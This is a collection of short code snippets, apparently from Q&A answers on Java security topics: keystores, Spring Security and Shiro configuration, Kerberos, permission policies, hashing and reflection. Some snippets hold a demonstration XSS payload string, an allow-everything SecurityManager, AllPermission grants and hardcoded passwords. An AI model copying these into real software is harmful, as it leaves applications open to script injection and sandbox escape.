---UNIQUEIDFORSNIP---|149101917|    Exception in thread "AWT-EventQueue-2" java.lang.AssertionError: java.lang.reflect.InvocationTargetException
    	at twitter4j.TwitterFactory.<clinit>(TwitterFactory.java:76)
        ...
    Caused by: java.lang.reflect.InvocationTargetException
    	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
    	... 42 more
    Caused by: java.lang.ExceptionInInitializerError
    	at twitter4j.internal.http.HttpClientWrapper.<init>(HttpClientWrapper.java:48)
    	... 47 more
    Caused by: java.security.AccessControlException: access denied 
            (java.util.PropertyPermission twitter4j.http.httpClient read)
    	at java.security.AccessControlContext.checkPermission(Unknown Source)
    	at java.security.AccessController.checkPermission(Unknown Source)
---UNIQUEIDFORSNIP---|149481331|    [main]
    ...
    [users]
    jsmith = password, role1
    ajones = anotherPassword, role1, role2
    [roles]
    role1 = perm1, perm2, ..., permN
    role2 = permA, permB, ..., permZ
---UNIQUEIDFORSNIP---|149495981|    FILE:/etc/krb5.keytab:
    Vno  Type                     Principal          Aliases
      6  aes256-cts-hmac-sha1-96 host/test.com@TEST.COM 
      6  arcfour-hmac-md5        host/test.com@TEST.COM 
---UNIQUEIDFORSNIP---|149522328|	public class MutableStringTest {
	
	
		// http://stackoverflow.com/questions/11146255/how-to-create-mutable-java-lang-string#11146288
		@Test
		public void testMutableString() throws Exception {
			final String s = createModifiableString();
			System.out.println(s);
			modify(s);
			System.out.println(s);
		}
	
		private final AtomicReference<CharBuffer> cbRef = new AtomicReference<CharBuffer>();
		private String createModifiableString() {
			Charset charset = new Charset("foo", null) {
				@Override
				public boolean contains(Charset cs) {
					return false;
				}
	
				@Override
				public CharsetDecoder newDecoder() {
					CharsetDecoder cd = new CharsetDecoder(this, 1.0f, 1.0f) {
						@Override
						protected CoderResult decodeLoop(ByteBuffer in, CharBuffer out) {
							cbRef.set(out);
							while(in.remaining()>0) {
								out.append((char)in.get());
							}
    						return CoderResult.UNDERFLOW;
						}
					};
					return cd;
				}
	
				@Override
				public CharsetEncoder newEncoder() {
					return null;
				}
			};
			return new String("abc".getBytes(), charset);
		}
		private void modify(String s) {
			CharBuffer charBuffer = cbRef.get();
			charBuffer.position(0);
			charBuffer.put("xyz");
		}
	
	}
---UNIQUEIDFORSNIP---|149522330|    abc
    zzz
---UNIQUEIDFORSNIP---|149749287|      private EntityManagerFactory getEntityManagerFactory() {
        return Persistence.createEntityManagerFactory( getPersistenceUnitName(),
          getProperties() );
      }
      
      private Map getProperties() {
        Map result = new HashMap();
        
        // Read the properties from a file instead of hard-coding it here.
        // Or pass the password in from the command-line.
        result.put( "javax.persistence.jdbc.password", "PASSWORD" );
        
        return result;
      }
---UNIQUEIDFORSNIP---|149986867|    <form method="POST" action="j_security_check">
      <input type="text" name="j_username">
      <input type="password" name="j_password">
    </form>
---UNIQUEIDFORSNIP---|150055498|    <c:out value="${SPRING_SECURITY_LAST_EXCEPTION.message}" />
---UNIQUEIDFORSNIP---|150122108|    List<Item> items = new ArrayList<Item>();
    // .get(int) and remove(int) return Item automatically
---UNIQUEIDFORSNIP---|150568318|    SecureRandom random = new SecureRandom();
    byte[] salt = new byte[64];
    random.nextBytes(salt);
    String password="god";
    MessageDigest md = MessageDigest.getInstance("SHA-512");
    md.update(password.getBytes(Charset.forName("UTF-8")));
    md.update(salt);
    byte[] digest = md.digest();
---UNIQUEIDFORSNIP---|150596815|    System.setProperty("os.name", "Windows");
---UNIQUEIDFORSNIP---|150596822|    @BeforeClass
    public static void setup() throws IOException {
    	System.setProperty("os.name.orig", System.getProperty("os.name"));
    
    }
    
    // other test case methods continue...
    
    @AfterClass
    public static void clearProperties() throws IOException {
    	System.setProperty("os.name", System.getProperty("os.name.orig"));
    	System.clearProperty("os.name.orig");
    }
---UNIQUEIDFORSNIP---|150755041|    <Connector port="8443"
    maxThreads="150" minSpareThreads="25" maxSpareThreads="75"
    enableLookups="true" disableUploadTimeout="true"
    acceptCount="100" debug="0" scheme="https" secure="true"
    clientAuth="false" sslProtocol="TLS"
    keystoreFile="c:/keystore.key"
    keystorePass="mypassword"
    SSLEnabled="true" />
---UNIQUEIDFORSNIP---|150755942|    @Autowired
    @Qualifier("jdbcUserService")  // <-- this references the bean id
    public UserDetailsManager userDetailsManager;
---UNIQUEIDFORSNIP---|150756947|    import { Http } from '@angular/http'; // old version
    import { HttpClient } from '@angular/common/http'; // new version
---UNIQUEIDFORSNIP---|150756949|    http
      .post('/api/items/add', body, {
        headers: new HttpHeaders().set('Authorization', 'my-auth-token'),
      })
---UNIQUEIDFORSNIP---|150764032|            if ((request.getUserPrincipal().getName()) != null) {
                String userName = request.getUserPrincipal().getName().trim();
                session.setAttribute("userName", userName);
                .....
                if (request.isUserInRole("ADMINS")) {
                  //do actions here
                }
            }
---UNIQUEIDFORSNIP---|151171617|    <div><textarea id="e1"></textarea></div>
    <div><textarea id="e2"></textarea></div>
    <div id="e3"/>
    
    var dangerous = '<scri' + 'pt>alert("Danger!");</scri' + 'pt>';
    document.getElementById('e1').value = dangerous;
    
    document.getElementById('e2').innerHTML = dangerous;
    
    dangerous = '</textarea>' + dangerous;
    var content = '<textarea>' + dangerous + '</textarea>';
    document.getElementById('e3').innerHTML = content;
    
    console.log('Done.');
---UNIQUEIDFORSNIP---|151171620|    String unfilteredInput = "</textarea><script>alert(\"Danger!\");</script>";
    out.write("<textarea>");
    out.write(content);
    out.write("</textarea>");
---UNIQUEIDFORSNIP---|151190146|    package testSwing;
    
    import javax.swing.UIDefaults;
    import com.sun.java.swing.plaf.windows.WindowsClassicLookAndFeel;
    
    public class WindowsClassicLookAndFeelExt extends WindowsClassicLookAndFeel    {
        @Override protected void initClassDefaults(UIDefaults table){
            super.initClassDefaults(table);
            Object[] uiDefaults = { "LabelUI", WindowsLabelExtUI.class.getCanonicalName()};
            table.putDefaults(uiDefaults);
        }
    }
---UNIQUEIDFORSNIP---|151190152|    package testSwing;
    import javax.swing.JComponent;
    import javax.swing.plaf.ComponentUI;
    import com.sun.java.swing.plaf.windows.WindowsLabelUI;
    
    public class WindowsLabelExtUI extends WindowsLabelUI{
        static WindowsLabelExtUI singleton = new WindowsLabelExtUI();
    
        public static ComponentUI createUI(JComponent c){
            c.putClientProperty("html.disable", Boolean.TRUE);    
            return singleton;
        }
    }
---UNIQUEIDFORSNIP---|151190156|    package testSwing;
    
    import java.awt.FlowLayout;
    import javax.swing.JFrame;
    import javax.swing.JLabel;
    import javax.swing.JList;
    import javax.swing.JScrollPane;
    import javax.swing.UIManager;
    
    
    public class Main{
        public static void main(String[] args){
            try{                UIManager.setLookAndFeel(WindowsClassicLookAndFeelExt.class.getCanonicalName());
            }catch (Exception e){
                e.printStackTrace();
            }
    
            JFrame frame = new JFrame("JList Test");
            frame.setLayout(new FlowLayout());
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    
            String[] selections = {"<html><img src='http:\\\\invalid\\url'>", "<html><H1>Hello</h1></html>", "orange", "dark blue"};
    
            JList list = new JList(selections);
    
            list.setSelectedIndex(1);
            System.out.println(list.getSelectedValue());
    
            JLabel jLabel = new JLabel("<html><h2>standard Label</h2></html>");
            frame.add(new JScrollPane(list));
            frame.add(jLabel);
            frame.pack();
    
            frame.setVisible(true);
        }
    }
---UNIQUEIDFORSNIP---|151239590|    Random rand = new SecureRandom()
    // 0 to 100 inclusive.
    int number = rand.nextInt(101);
---UNIQUEIDFORSNIP---|151239593|    // 0 inclusive to 100 exclusive.
    int number = rand.nextInt(100);
---UNIQUEIDFORSNIP---|151278928|    String validatedAlertId = ESAPI.validator().getValidInput("alertId", alertId, "AlertIdRejex", 25, false);
---UNIQUEIDFORSNIP---|151278933|        public String security(String s) {
                System.out.println("connect 1");
                valiDatedString = ESAPI.validator().getValidInput("test", "xxxxx@gmail.com", "Email", 100, false);                
                System.out.println("connect 2"+valiDatedString);
                return valiDatedString
            }
---UNIQUEIDFORSNIP---|151573580|    id
    username
    password
    failedAttempts (int)
    lastFailed (date)
    lastLogin (date)
---UNIQUEIDFORSNIP---|151582445|	private class MySecurityManager extends SecurityManager {
		@Override
		public void checkPermission(Permission perm) {
			return;
		}
	}
---UNIQUEIDFORSNIP---|151582447|    SecurityManager sm = new MySecurityManager();
    System.setSecurityManager(sm);
---UNIQUEIDFORSNIP---|151600881|    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws ServletException, IOException {    
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        HttpSession session = request.getSession(false);
        String loginURL = request.getContextPath() + "/pages/index.xhtml";
        boolean loggedIn = (session != null) && (session.getAttribute("estaLoggeado") != null);
        boolean loginRequest = request.getRequestURI().equals(loginURL);
        boolean resourceRequest = request.getRequestURI().startsWith(request.getContextPath() + ResourceHandler.RESOURCE_IDENTIFIER + "/");
        if (loggedIn || loginRequest || resourceRequest)) {
            chain.doFilter(request, response); // So, just continue request.
        }
        else {
            response.sendRedirect(loginURL); // So, redirect to login page.
        }
    }
---UNIQUEIDFORSNIP---|151609899|These industry standard build tools surely do not make 'inherently dubious use of the HTTP protocol', right?
---UNIQUEIDFORSNIP---|151716400|    writer.setEncryption(PdfWriter.ENCRYPTION_AES_128, finalpass, finalpass, PdfWriter.AllowPrinting);
---UNIQUEIDFORSNIP---|151716402|    writer.setEncryption(PdfWriter.ENCRYPTION_AES_128, finalpass, "TheOwnerPassword", PdfWriter.AllowPrinting);
---UNIQUEIDFORSNIP---|152057983|    public static void main(String[] args)
    {
        boolean quit = false;
        String serverPolicyPath = "/Policies/Server.policy";
        URL serverPolicyURL = Main.class.getResource(serverPolicyPath);
        if (serverPolicyURL == null)
        {
            System.err.println("getResource returned NULL");
            return;
        }
        System.setProperty("java.security.policy",serverPolicyURL.toString());
        Policy.getPolicy().refresh();
        ...
---UNIQUEIDFORSNIP---|152171589|    JDBCRealm realm = (JDBCRealm) Realm.getInstance("realmName");
---UNIQUEIDFORSNIP---|152171591|    DataSource datasource = (DataSource) initialContext.lookup("jdbc/MyJDBCRealm");
---UNIQUEIDFORSNIP---|152179178|    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    	xmlns="http://java.sun.com/xml/ns/javaee"
    	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    	id="WebApp_ID" version="3.0">
    	<display-name>test-jetty</display-name>
    	<welcome-file-list>
    		<welcome-file>index.html</welcome-file>
    		<welcome-file>index.htm</welcome-file>
    		<welcome-file>index.jsp</welcome-file>
    		<welcome-file>default.html</welcome-file>
    		<welcome-file>default.htm</welcome-file>
    		<welcome-file>default.jsp</welcome-file>
    	</welcome-file-list>
    	<security-constraint>
    		<web-resource-collection>
    			<web-resource-name>Secured area</web-resource-name>
    			<url-pattern>/*</url-pattern>
    		</web-resource-collection>
    		<auth-constraint>
    			<role-name>admin</role-name>
    		</auth-constraint>
    		<user-data-constraint>
    			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
    		</user-data-constraint>
    	</security-constraint>
    	<login-config>
    		<auth-method>BASIC</auth-method>
    		<realm-name>Test Realm</realm-name>
    	</login-config>
    	<security-role>
    		<role-name>admin</role-name>
    	</security-role>
    </web-app>
---UNIQUEIDFORSNIP---|152341979|     <!-- redirect url for failure of authentication -->
     <bean id="simpleUrlAuthenticationFailureHandler" class="org.springframework.security.web.authentication.SimpleUrlAuthenticationFailureHandler">
          	<constructor-arg value="/login.jsp?error=1"></constructor-arg>
    </bean>
---UNIQUEIDFORSNIP---|152374792|    /etc/java-6-sun/security/java.security
---UNIQUEIDFORSNIP---|152745638|    <security>
        <all-permissions/>
    </security>
---UNIQUEIDFORSNIP---|152750452|    security.provider.#=org.bouncycastle.jce.provider.BouncyCastleProvider 
---UNIQUEIDFORSNIP---|152750465|    Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
---UNIQUEIDFORSNIP---|152750467|    security.provider.5=org.bouncycastle.jce.provider.BouncyCastleProvider 
---UNIQUEIDFORSNIP---|152763221|    Application-Name: Name
    Application-Library-Allowable-Codebase: *
    Caller-Allowable-Codebase: *
---UNIQUEIDFORSNIP---|152778574|    KeyStore.load(InputStream is, String pass);
---UNIQUEIDFORSNIP---|152856677|    grant codeBase "file:///path/yourcomponent.jar" {
          permission java.lang.RuntimePermission "loadLibrary.jzmq";
    };
---UNIQUEIDFORSNIP---|152856679|    grant codeBase "file:///C:/component/policytest.jar" {
          permission java.security.AllPermission;
    };
---UNIQUEIDFORSNIP---|153042009|    KeyStore ks = KeyStore.getInstance("PKCS12");
    FileInputStream fis = new FileInputStream("/path/to/file.p12");
    ks.load(fis, "password".toCharArray());
    KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
    kmf.init(ks, "password".toCharArray());
    SSLContext sc = SSLContext.getInstance("TLS");
    sc.init(kmf.getKeyManagers(), null, null);
---UNIQUEIDFORSNIP---|153042012|    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
    if (connection instanceof HttpsURLConnection) {
        ((HttpsURLConnection)connection)
             .setSSLSocketFactory(sc.getSSLSocketFactory());
    }
---UNIQUEIDFORSNIP---|153081424|    sudo apt-get install ca-certificates-java
---UNIQUEIDFORSNIP---|153081428|    javaHome = /usr/lib/jvm/java-7-openjdk-amd64/jre 
---UNIQUEIDFORSNIP---|153271195|    ext['tomcat.version']='8.0.36'
---UNIQUEIDFORSNIP---|153271201|    <properties>
        <tomcat.version>8.0.36</tomcat.version>
    </properties>
---UNIQUEIDFORSNIP---|153401209|    byte[] key = pbkdf2(password, salt, 1000, 16)
    Mac mac = Mac.getInstance("HmacSHA1");
    mac.init(new SecretKeySpec(key, "HmacSHA1");
       
    byte[] macResult = mac.doFinal(...);
---UNIQUEIDFORSNIP---|153710061|    class Dummy{
        private void foo(){
            System.out.println("hello foo()");
        }
        private int i = 10;
    }
    class Test{
        public static void main(String[] args) throws Exception {
            Dummy d = new Dummy();
            /*---  [INVOKING PRIVATE METHOD]  ---*/
            Method m = Dummy.class.getDeclaredMethod("foo");
            //m.invoke(d); // Exception java.lang.IllegalAccessException
            m.setAccessible(true);//Abracadabra
            m.invoke(d); // Now it's OK
            /*---  [GETING VALUE FROM PRIVATE FIELD]  ---*/
            Field f = Dummy.class.getDeclaredField("i");
            //System.out.println(f.get(d)); // Not accessible now
            f.setAccessible(true); // Abracadabra
            System.out.println(f.get(d)); // Now it's OK
            /*---  [SETTING VALUE OF PRIVATE FIELD]  ---*/
            Field f2 = Dummy.class.getDeclaredField("i");
            //f2.set(d,20); // Not accessible now
            f2.setAccessible(true); // Abracadabra
            f2.set(d, 20); // Now it's OK
            System.out.println(f2.get(d));
        }
    }
---UNIQUEIDFORSNIP---|153710065|    class Dummy {
        private void safeMethod() {
            StackTraceElement[] st = new Exception().getStackTrace();
            // If a method was invoked by reflection, the stack trace would be similar
            // to something like this:
            /*
            java.lang.Exception
                at package1.b.Dummy.safeMethod(SomeClass.java:38)
                at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
                at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
                at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
            ->    at java.lang.reflect.Method.invoke(Method.java:601)
                at package1.b.Test.main(SomeClass.java:65)
            */
            //5th line marked by "->" is interesting one so I will try to use that info
            if (st.length > 5 &&
                st[4].getClassName().equals("java.lang.reflect.Method"))
                throw new RuntimeException("safeMethod() is accessible only by Dummy object");
            // Now normal code of method
            System.out.println("code of safe method");
        }
        // I will check if it is possible to normally use that method inside this class
        public void trySafeMethod(){
            safeMethod();
        }
        Dummy() {
            safeMethod();
        }
    }
    class Dummy1 extends Dummy {}
    class Test {
        public static void main(String[] args) throws Exception {
            Dummy1 d1 = new Dummy1(); // safeMethod can be invoked inside a superclass constructor
            d1.trySafeMethod(); // safeMethod can be invoked inside other Dummy class methods
            System.out.println("-------------------");
            // Let's check if it is possible to invoke it via reflection
            Method m2 = Dummy.class.getDeclaredMethod("safeMethod");
            // m.invoke(d);//exception java.lang.IllegalAccessException
            m2.setAccessible(true);
            m2.invoke(d1);
        }
    }
---UNIQUEIDFORSNIP---|153710075|    code of safe method
    code of safe method
    -------------------
    Exception in thread "main" java.lang.reflect.InvocationTargetException
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at package1.b.Test.main(MyClass2.java:87)
    Caused by: java.lang.RuntimeException: method safeMethod() is accessible only by Dummy object
        at package1.b.Dummy.safeMethod(MyClass2.java:54)
        ... 5 more
---UNIQUEIDFORSNIP---|153791099|    grant {
    };
---UNIQUEIDFORSNIP---|154038165|    public static void main(String[] args) {
        if (args.length == 2 && args[0].equals("--args")) {
            args = args[1].split(";;");
        }
        // Continue as normal 
    }
---UNIQUEIDFORSNIP---|154038168|    <application-desc main-class="com.example.app.Main">
        <argument>--args</argument>
        <argument>*</argument>
    </application-desc>
---UNIQUEIDFORSNIP---|154038170|    <application-desc main-class="com.example.app.Main">
        <argument>--args</argument>
        <argument>files.txt;;29;;true;;1384212567908</argument>
    </application-desc>
---UNIQUEIDFORSNIP---|154158342|    public String signData(final String data, final String privateKeyString) throws NoSuchAlgorithmException, InvalidKeySpecException, InvalidKeyException, SignatureException {
    
            X509EncodedKeySpec keySpec = new X509EncodedKeySpec(privateKeyString.getBytes());
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PrivateKey privateKey = keyFactory.generatePrivate(keySpec);
    
    
            Signature signature = Signature.getInstance("SHA256withRSA");
            signature.initSign(privateKey);
            signature.update(data.getBytes());
            byte[] sign = signature.sign();
            return new String(sign);
        }
---UNIQUEIDFORSNIP---|154178977|        private boolean checkAuthorised(){
            PackageManager pm = getPackageManager();
            try {
                for (Signature sig :
                    pm.getPackageInfo(pm.getNameForUid(getCallingUid()),
                            PackageManager.GET_SIGNATURES).signatures){
                    LogUtils.logD("Signature: " + sig.toCharsString());
                    if (Security.trustedSignatures.get(sig.toCharsString()) != null) {
                        return true;
                    }
                }
            } catch (NameNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            
            LogUtils.logD("Couldn't find signature in list of trusted keys! Possibilities:");
            for(String sigString : Security.trustedSignatures.keySet()){
                LogUtils.logD(sigString);
            }
            
            /* Crash the calling application if it doesn't catch */
            throw new SecurityException();
            
        }
---UNIQUEIDFORSNIP---|154178982|    Map<String,String>().put("public key","some description eg. name");
---UNIQUEIDFORSNIP---|154396847|        Content-Security-Policy: default-src 'self'   --only allow content from your own site
        X-XSS-Protection: 1; mode=block   --prevent some reflective attacks in some browsers
        X-Content-Type-Options: nosniff   --can't trick browser into detecting and running js in other content types
---UNIQUEIDFORSNIP---|154396849|    Use [Hibernate Validator][2] (you don't need to use Hibernate ORM to use this) with the `@SafeHtml` annotation on all user-supplied String fields.
    You could validate all request headers, post params and query params in one Interceptor for simplistic XSS validation. 
---UNIQUEIDFORSNIP---|154396852|    Use OWASP's [Java Encoder Project][3] `<e:forHtml value="${attr}" />` to escape output or JSTL's `<c:out value="${attr}"/>` and in `web.xml` set 
        <context-param>
            <param-name>defaultHtmlEscape</param-name>
            <param-value>true</param-value>
        </context-param>
---UNIQUEIDFORSNIP---|154396854|        <session-config>
            <cookie-config>
                <!-- browser will disallow JavaScript access to session cookie -->
                <http-only>true</http-only>
            </cookie-config>
            <tracking-mode>COOKIE</tracking-mode>
        </session-config>
---UNIQUEIDFORSNIP---|154710483|    WSCredential credential = (WSCredential) _sharedState.get(com.ibm.wsspi.security.
                auth.callback.Constants.WSCREDENTIAL_KEY);
    UserRegistry registry = RegistryHelper.getUserRegistry(credential.getRealmName());
    String[] grpList = ldapEntry.getAttribute("myEntGrps").getValues();
    [..]
      credential.getGroupIds().add("group:"+credential.getRealmName()+"/"+registry.getGroupSecurityName(grpList[i]));
---UNIQUEIDFORSNIP---|154710488|group:MyLdapRealm/cn=myGroup,ou..
---UNIQUEIDFORSNIP---|154736056|    @RunWith(SpringRunner.class)
    @WebMvcTest(controllers=ARestController.class)
    @Import(WebSecurityConfig.class) // <---
    public class ARestControllerTest { ... }
---UNIQUEIDFORSNIP---|154806974|    SOAPMessage soapMessageResponse = connection.call(soapRequest, new URL(serviceLocation));
---UNIQUEIDFORSNIP---|154808085|    SOAPMessage soapMessageResponse = connection.call(soapRequest, new URL(serviceLocation));
---UNIQUEIDFORSNIP---|155076327|    class Foo {
      private final Date date;
      Foo() { this.date = new Date(); }
      Date getDate() { return date; }
    }
---UNIQUEIDFORSNIP---|155150804|    HttpServletResponse res = (HttpServletResponse) response;
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate"); // HTTP 1.1.
    res.setHeader("Pragma", "no-cache"); // HTTP 1.0.
    res.setDateHeader("Expires", 0); // Proxies.
    chain.doFilter(request, response);
---UNIQUEIDFORSNIP---|155254728|    class RestrictingClassLoader extends URLClassLoader {
      @Override
      public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (!name.startsWith("com.example.") || name.startsWith("com.example.api."))
          return super.loadClass(name);
        return findClass(name);
      }
    }
    class RestrictingSecurityManager extends SecurityManager {
      private boolean isRestricted() {
        for (Class<?> cls: getClassContext())
          if (cls.getClassLoader() instanceof RestrictingClassLoader)
            return true;
        return false;
      }
      // Implement other checks based on isRestricted().
    }
---UNIQUEIDFORSNIP---|155551476|    import java.nio.charset.Charset;
    
    import org.bouncycastle.util.encoders.Base64;
    
    public class PBKDF2 {
	
    	public static void main(String[] args) {
    		try {
    			String password = "iamtwentycharacterss";
    			String salt = "50.eGIYr3ZpxpWw67utH17s/A==";
    			int iterations = Integer.parseInt(salt.substring(0, salt.indexOf('.')));
    			byte[] saltBytes = salt.getBytes(Charset.forName("UTF-8"));
    			
    			Rfc2898DeriveBytes rfc2898 = new Rfc2898DeriveBytes(password, saltBytes, iterations);
    			byte[] key = rfc2898.getBytes(64);
    			String hash = new String(Base64.encode(key));
    			System.out.println(hash);
    		} catch (Exception ex) {
    			System.out.println("ERROR: " + ex);
    		}
    	}
    	
    }
---UNIQUEIDFORSNIP---|155657652|    Random r = new SecureRandom();    
    BigInteger q = something_big;
    BigInteger ans;
    
    do
        ans = BigInteger(bits_in_q, r);
    while (ans.compareTo(q) >= 0); // bn_rand_range generates numbers < q
---UNIQUEIDFORSNIP---|155663544|    [main]
    shiro.loginURL = /login.xhtml
    myRealm = com.example.shiro.MyRealm
    securityManager.realms = $myRealm
    [urls]
    /account/** = authc
    /logout = logout
---UNIQUEIDFORSNIP---|156750935|keytool -genkey -noprompt -alias "$alias" -dname "CN=$dname_cn, OU=$dname_ou, O=$dname_o, L=$dname_l, S=$dname_s, C=$dname_c" -keystore "$keystore" -storepass "$storepass" -keypass "$keypass"
---UNIQUEIDFORSNIP---|156750937|keytool -export -alias "$alias" -storepass "$storepass" -file "$alias".cer -keystore "$keystore"
---UNIQUEIDFORSNIP---|156750939|    SSLContextConfigurator sslContextConfigurator = new SSLContextConfigurator();
    // set up security context
    sslContextConfigurator.setKeyStoreFile(configuration.getKeystore()); // contains the server keypair
    sslContextConfigurator.setKeyStorePass(configuration.getKeystorePassword());
    sslContextConfigurator.setKeyStoreType(configuration.getKeystoreType());
    sslContextConfigurator.setKeyPass(configuration.getKeystoreKeypass());
    sslContextConfigurator.setTrustStoreFile(configuration.getTruststore()); // contains the list of trusted certificates
    sslContextConfigurator.setTrustStorePass(configuration.getTruststorePassword());
    sslContextConfigurator.setTrustStoreType(configuration.getTruststoreType());
    if (!sslContextConfigurator.validateConfiguration(true))
        throw new Exception("Invalid SSL configuration");
---UNIQUEIDFORSNIP---|156869691|			Gson gson = new Gson();
			String escaped = gson.toJson(value);
			if(value instanceof String) {
				if(escaped.startsWith("\"")) {
					escaped = escaped.substring(1);
				}
				if(escaped.endsWith("\"")) {
					escaped = escaped.substring(0, escaped.length() - 1);
				}
				return escaped;
			}
			value = escaped;
---UNIQUEIDFORSNIP---|156936945|    @RequestMapping(value = "/my/custom/url", method=RequestMethod.POST)
---UNIQUEIDFORSNIP---|156936947|    @RequestMapping(value = "/my/custom/url", method=RequestMethod.POST)
    public String myFunction(HttpSession session,
        HttpServletRequest request,
        @RequestBody MyBean bean,
        Errors errors, RedirectAttributes redirectAttributes)
---UNIQUEIDFORSNIP---|157042077|    RoleVoter.setRolePrefix("");
---UNIQUEIDFORSNIP---|157055849|    ContextHandler handler = contextHandlerCallback.getContextHandler();
    HttpServletRequest request = (HttpServletRequest)handler.getValue("com.bea.contextelement.servlet.HttpServletRequest");
---UNIQUEIDFORSNIP---|157071073|    $ git clone https://github.com/physion/osx-keychain-java
    $ mvn install
    $ cp dist/osxkeychain.jar ~/myproject/external
---UNIQUEIDFORSNIP---|157071075|    <dependency>
      <groupId>us.physion</groupId>
      <artifactId>osx-keychain</artifactId>
      <version>1.0</version>
      <scope>system</scope>
      <systemPath>${project.basedir}/external/osxkeychain.jar</systemPath>
    </dependency>
---UNIQUEIDFORSNIP---|157071077|    osx-keychain-java$ jshell -cp ./dist/osxkeychain.jar
    
    jshell> import com.mcdermottroe.apple.*;
    jshell> OSXKeychain keychain = OSXKeychain.getInstance();
    keychain ==> com.mcdermottroe.apple.OSXKeychain@2286778
    
    jshell> keychain.addGenericPassword("aardvark", "a", "b");
    
    jshell> keychain.findGenericPassword("aardvark", "a");
    $4 ==> "b"
---UNIQUEIDFORSNIP---|157248563|    com.sun.security.jgss.login {
      com.sun.security.auth.module.Krb5LoginModule required
      useKeyTab=true
      storeKey=true
      keyTab=<keytab>
      principal=<principal>;
    };
    com.sun.security.jgss.initiate {
      com.sun.security.auth.module.Krb5LoginModule required
      useKeyTab=true
      storeKey=true
      keyTab=<keytab>
      principal=<principal>;
    };
    com.sun.security.jgss.accept {
      com.sun.security.auth.module.Krb5LoginModule required
      useKeyTab=true
      storeKey=true
      keyTab=<keytab>
      principal=<principal>;
    };
---UNIQUEIDFORSNIP---|157248565|    [libdefaults]
      ...
      default_tkt_enctypes = aes256-cts aes128-cts rc4-hmac des3-cbc-sha1 des-cbc-md5 des-cbc-crc
      default_tgs_enctypes = aes256-cts aes128-cts rc4-hmac des3-cbc-sha1 des-cbc-md5 des-cbc-crc
      permitted_enctypes = aes256-cts aes128-cts rc4-hmac des3-cbc-sha1 des-cbc-md5 des-cbc-crc
      ...
---UNIQUEIDFORSNIP---|157518673|    // <applet code=ReflectApplet width=40 height=40>
    public class ReflectApplet extends java.applet.Applet {
    	public void init() {
    		try {
    			Class c = getClass().getClassLoader().loadClass("TestLoad");
    			Object o = c.newInstance();
    			TestLoad tl = (TestLoad)o;
    		} catch(Throwable t) {
    			t.printStackTrace();
    		}
    	}
    }
    
    class TestLoad {
    
    	TestLoad() {
    		System.out.println("Test Load constructor");
    	}
    }
---UNIQUEIDFORSNIP---|157518678|    Test Load constructor
---UNIQUEIDFORSNIP---|157518679|    java.security.AccessControlException: access denied 
        (java.util.PropertyPermission sun.java2d.opengl write)
---UNIQUEIDFORSNIP---|157581156|    	private class CustomPermissionCollection extends PermissionCollection {
		
		private static final long serialVersionUID = 5654758059940546018L;
		
		Collection<Permission> perms = new ArrayList<Permission>();
		@Override
		public void add(Permission permission) {
			perms.add(permission);
		}
		@Override
		public boolean implies(Permission permission) {
			for (Permission p : perms) {
				if (p.implies(permission))
					return true;
			}
			return false;
		}
		@Override
		public Enumeration<Permission> elements() {
			return Collections.enumeration(perms);
		}
		
	}
---UNIQUEIDFORSNIP---|157581159|    @Override
	public PermissionCollection newPermissionCollection() {
		return new CustomPermissionCollection();
	}
---UNIQUEIDFORSNIP---|157635320|    <xacml-ctx:Request ReturnPolicyIdList="false" CombinedDecision="false" xmlns:xacml-ctx="urn:oasis:names:tc:xacml:3.0:core:schema:wd-17">
       <xacml-ctx:Attributes Category="urn:oasis:names:tc:xacml:3.0:attribute-category:resource" >
          <xacml-ctx:Attribute AttributeId="urn:oasis:names:tc:xacml:1.0:resource:resource-id" IncludeInResult="false">
             <xacml-ctx:AttributeValue DataType="http://www.w3.org/2001/XMLSchema#anyURI">http://medico.com/record/patient/BartSimpson</xacml-ctx:AttributeValue>
          </xacml-ctx:Attribute>
       </xacml-ctx:Attributes>
       <xacml-ctx:Attributes Category="urn:oasis:names:tc:xacml:3.0:attribute-category:environment" >
       </xacml-ctx:Attributes>
       <xacml-ctx:Attributes Category="urn:oasis:names:tc:xacml:1.0:subject-category:access-subject" >
          <xacml-ctx:Attribute AttributeId="urn:oasis:names:tc:xacml:2.0:conformance-test:age" IncludeInResult="false">
             <xacml-ctx:AttributeValue DataType="http://www.w3.org/2001/XMLSchema#integer">45</xacml-ctx:AttributeValue>
          </xacml-ctx:Attribute>
          <xacml-ctx:Attribute AttributeId="urn:oasis:names:tc:xacml:1.0:subject:subject-id" IncludeInResult="false">
             <xacml-ctx:AttributeValue DataType="http://www.w3.org/2001/XMLSchema#string">Julius Hibbert</xacml-ctx:AttributeValue>
          </xacml-ctx:Attribute>
       </xacml-ctx:Attributes>
       <xacml-ctx:Attributes Category="urn:oasis:names:tc:xacml:3.0:attribute-category:action" >
          <xacml-ctx:Attribute AttributeId="urn:oasis:names:tc:xacml:1.0:action:action-id" IncludeInResult="false">
             <xacml-ctx:AttributeValue DataType="http://www.w3.org/2001/XMLSchema#string">read</xacml-ctx:AttributeValue>
          </xacml-ctx:Attribute>
       </xacml-ctx:Attributes>
    </xacml-ctx:Request>
